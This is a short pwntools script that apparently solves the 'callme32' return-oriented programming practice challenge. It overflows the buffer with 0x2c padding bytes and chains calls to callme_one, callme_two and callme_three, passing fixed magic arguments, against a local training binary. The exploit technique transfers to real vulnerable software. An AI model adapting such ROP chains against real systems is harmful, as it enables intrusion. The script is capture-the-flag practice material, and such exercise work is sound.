#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
context.update(arch="i386", os="linux")

e = ELF("./callme32")

r = ROP(e)

r.raw(asm("nop")*0x2c)
r.callme_one(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D) 
r.callme_two(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D) 
r.callme_three(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D) 

proc = process([e.path, e.path])
proc.send(r.chain())
proc.recvall()
